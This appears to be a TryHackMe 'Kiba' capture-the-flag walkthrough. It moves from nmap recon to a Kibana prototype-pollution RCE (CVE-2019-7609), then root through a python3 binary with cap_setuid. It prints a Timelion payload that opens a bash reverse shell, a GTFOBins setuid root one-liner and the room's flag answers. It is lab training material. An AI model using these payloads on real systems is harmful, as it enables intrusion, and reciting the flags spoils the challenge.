# Kiba Walkthrough
### Link
- https://tryhackme.com/room/kibas
---
About the answer of this question, I did some research. I found this [link](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/).

It's really helpfull to understand this type of vulnerability.

**Question**
#### What is the vulnerability that is specific to programming languages with prototype-based inheritance?
**Answer** 
#### prototype pollution
---
### Recon
First scan to check all ports
```
sudo nmap -p- [IP]
```
**Namp scan result**
```
Nmap scan report for 10.10.238.103
Host is up (0.094s latency).
Not shown: 64438 closed ports, 1093 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent
```
Second scan only focused on findings ports
```
sudo nmap -sS -sC -sV -p 22,80,5044,5601 [IP]
```
```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Sun, 09 Jan 2022 22:23:35 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Sun, 09 Jan 2022 22:23:32 GMT
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Sun, 09 Jan 2022 22:23:32 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.91%I=7%D=1/9%Time=61DB6063%P=x86_64-apple-darwin17.7.0
SF:%r(GetRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana
SF:\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab5
SF:4e3e6c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnect
SF:ion:\x20close\r\nDate:\x20Sun,\x2009\x20Jan\x202022\x2022:23:32\x20GMT\
SF:r\n\r\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-na
SF:me:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\n
SF:content-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x
SF:20no-cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x2
SF:0Sun,\x2009\x20Jan\x202022\x2022:23:32\x20GMT\r\n\r\n{\"statusCode\":40
SF:4,\"error\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(SSLSessionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Termi
SF:nalServerCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSS
SF:essionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1
SF:C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x
SF:20Not\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d0
SF:4923283ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=u
SF:tf-8\r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnecti
SF:on:\x20close\r\nDate:\x20Sun,\x2009\x20Jan\x202022\x2022:23:35\x20GMT\r
SF:\n\r\n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\
SF:x20Found\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\
SF:n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptio
SF:ns,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.07 seconds
```

**Question**
#### What is the version of visualization dashboard installed in the server?
- Connect to http://[IP]:5601
- From the User Interface, Go to **Management** and you find the version.
**Answer** 
#### 6.5.4

**Question**
#### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
Ask the question to Google and you find this [link](https://github.com/mpgn/CVE-2019-7609)
**Answer** 
#### CVE-2019-7609
---
### Exploit
**Question**
#### Compromise the machine and locate user.txt
Based on the [link](https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/) from the question 1, we just need to follow the process.

- First: From the Kibana user interface, click on **Timelion**
- Second: Copy/Paste the code from [here](https://github.com/mpgn/CVE-2019-7609)
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/[Local IP]/[Local PORT] 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
- Third: Update the information about Your IP and Port
- Fourth: Start listener
- Fifth: Execute the command
- Sixth: Move to **Canvas** *Be really patient and try this sequence many times because it soesn't work at the first attempt*
- Seventh: Get the Shell access and find the **user.txt** file
```
 find / -name user.txt 2>/dev/null
```
```
Connection from 10.10.19.73:59918
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$
kiba@ubuntu:/home/kiba/kibana/bin$ cd ../..
kiba@ubuntu:/home/kiba$ ls -l
total 110616
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
**Answer** 
#### THM{1s_easy_pwn3d_k1bana_w1th_rce}
---
### Privilege escalation
**Information**
```
Capabilities is a concept that provides a security system that allows "divide" root privileges into different values
```
**Question**
#### How would you recursively list all of these capabilities?
Quick search and find the man of [getcap](https://man7.org/linux/man-pages/man8/getcap.8.html) and this [link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#binaries-capabilities)
```
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
**Answer** 
#### getcap -r /
One information drew my attention: **/home/kiba/.hackmeplease/python3 = cap_setuid+ep**. Let's check the hidden directory **.hackmeplease**
```
kiba@ubuntu:/home/kiba$ cd .hackmeplease
cd .hackmeplease
kiba@ubuntu:/home/kiba/.hackmeplease$ ls -l
ls -l
total 4348
-rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3
```
We can execute python command.Let's check [gtfobins](https://gtfobins.github.io/) and serach something related to **python**

I found that : [Link](https://gtfobins.github.io/gtfobins/python/#capabilities). Let's execute the command related to **capabilities**
```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
We are **root**
```
find / -name root.txt 2>/dev/null
```
```        
whoami
root
cd /root
ls
root.txt
ufw
cat root.txt
```
**Answer** 
#### THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}


